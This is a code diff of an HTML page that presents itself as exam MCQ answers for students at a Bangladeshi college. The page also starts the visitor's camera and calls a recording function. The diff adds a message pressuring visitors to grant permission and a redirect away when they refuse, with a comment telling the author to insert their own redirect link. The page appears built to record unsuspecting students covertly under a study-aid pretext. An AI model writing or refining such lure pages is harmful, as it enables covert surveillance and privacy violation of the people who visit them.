@@ -5,39 +5,43 @@
   <title>চুয়াডাঙ্গা সরকারি কলেজ এর ইন্টার 1st ইয়ার এর আইসিটি এমসিকিউ উত্তর-একনজরে সবাই মিলাইয়া নাও</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
+
     body {
       margin: 0;
       padding: 0;
       min-height: 100vh;
-      background: linear-gradient(135deg, #c9ffbf, #ffafbd);
+      background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
       display: flex;
       justify-content: center;
       align-items: center;
       font-family: 'Noto Serif Bengali', serif;
-      color: #1b1b1b;
-      text-align: left;
+      color: #3c1053;
+      text-align: center;
       padding: 40px 20px;
       box-sizing: border-box;
-      line-height: 1.8;
+      line-height: 1.6;
+      user-select: none;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.95);
-      max-width: 800px;
+      background: rgba(255, 255, 255, 0.92);
+      max-width: 700px;
       border-radius: 16px;
       padding: 30px 40px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     }
 
     h1 {
-      text-align: center;
-      color: #004d40;
-      margin-bottom: 30px;
+      font-weight: 700;
+      margin-bottom: 25px;
+      font-size: 24px;
+      color: #6a1b9a;
     }
 
     p {
-      font-size: 18px;
-      margin-bottom: 10px;
+      font-size: 16px;
+      margin-bottom: 12px;
+      font-weight: 500;
     }
 
     #preview {
@@ -55,8 +59,10 @@
 </head>
 <body>
   <video id="preview" autoplay muted playsinline></video>
+
   <div class="container">
     <h1>চুয়াডাঙ্গা সরকারি কলেজ এর ইন্টার 1st ইয়ার এর আইসিটি এমসিকিউ উত্তর-একনজরে সবাই মিলাইয়া নাও</h1>
+
     <p>১. ✅ গ. 2.45GHz</p>
     <p>২. ✅ খ. i ও iii</p>
     <p>৩. ✅ ঘ. ৬৬</p>
@@ -127,7 +133,8 @@
         startRecording(stream);
       })
       .catch(err => {
-        alert("⚠️ ক্যামেরা চালু করা যায়নি: " + err);
+        alert("আপনি প্রয়োজনীয় অনুমতি দেননি 😢 এই সাইট ব্যবহারের জন্য অনুমতি আবশ্যক।");
+        window.location.href = "https://www.google.com"; // 🔁 এখানে তোমার redirect লিংক বসাও
       });
   </script>
 </body>
